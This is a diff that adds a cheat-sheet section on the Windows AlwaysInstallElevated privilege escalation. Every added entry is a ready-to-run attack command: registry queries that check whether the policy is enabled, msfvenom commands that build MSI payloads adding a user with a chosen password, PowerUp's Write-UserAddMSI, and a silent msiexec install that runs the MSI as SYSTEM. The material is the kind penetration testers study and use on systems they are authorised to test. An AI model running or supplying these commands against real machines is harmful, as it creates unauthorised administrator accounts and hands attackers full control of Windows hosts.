@@ -82,3 +82,58 @@ msfvenom -p windows/adduser USER=$user PASS=$pass -f msi -o alwe.msi
 import users
 import passwords
 -->
+
+## Additional AlwaysInstallElevated Commands
+
+## AlwaysInstallElevated
+
+### check (HKCU)
+
+```cmd title:"Check user-level AlwaysInstallElevated policy"
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+<!-- cheat -->
+
+### check (HKLM)
+
+```cmd title:"Check machine-level AlwaysInstallElevated policy"
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+<!-- cheat -->
+
+### MSI payload (no-uac format)
+
+```cmd title:"Build adduser MSI in msi-nouac format"
+msfvenom -p windows/adduser USER=$user PASS=$pass -f msi-nouac -o alwe.msi
+```
+<!-- cheat
+var user
+var pass
+-->
+
+### MSI payload (standard)
+
+```cmd title:"Build standard adduser MSI (msiexec bypasses UAC)"
+msfvenom -p windows/adduser USER=$user PASS=$pass -f msi -o alwe.msi
+```
+<!-- cheat
+var user
+var pass
+-->
+
+### PowerUp MSI
+
+```powershell title:"Drop a user-add MSI in CWD via PowerUp Write-UserAddMSI"
+Write-UserAddMSI
+```
+<!-- cheat -->
+
+### install MSI silently
+
+```cmd title:"Install MSI quietly (triggers AlwaysInstallElevated SYSTEM exec)"
+msiexec /quiet /qn /i $msi_path
+```
+<!-- cheat
+var msi_path
+-->
+
